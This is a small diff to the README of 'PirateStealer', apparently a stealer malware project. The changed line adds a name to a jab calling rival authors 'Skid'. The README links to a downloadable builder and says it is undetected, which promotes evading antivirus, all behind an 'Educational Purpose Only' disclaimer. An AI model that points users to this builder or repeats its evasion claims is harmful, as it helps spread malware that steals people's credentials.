@@ -1,4 +1,4 @@
-#### ⚠️ Proof Of Concept && Educational Purpose Only && KingFA == Skid⚠️
+#### ⚠️ Proof Of Concept && Educational Purpose Only && KingFA, babastealer == Skid⚠️
 # PirateStealer 
 # Click here [Builder](https://github.com/bytixo/PirateStealer/releases/download/1.4.5/PirateStealerBuilder.zip) (Undected as of now)
 
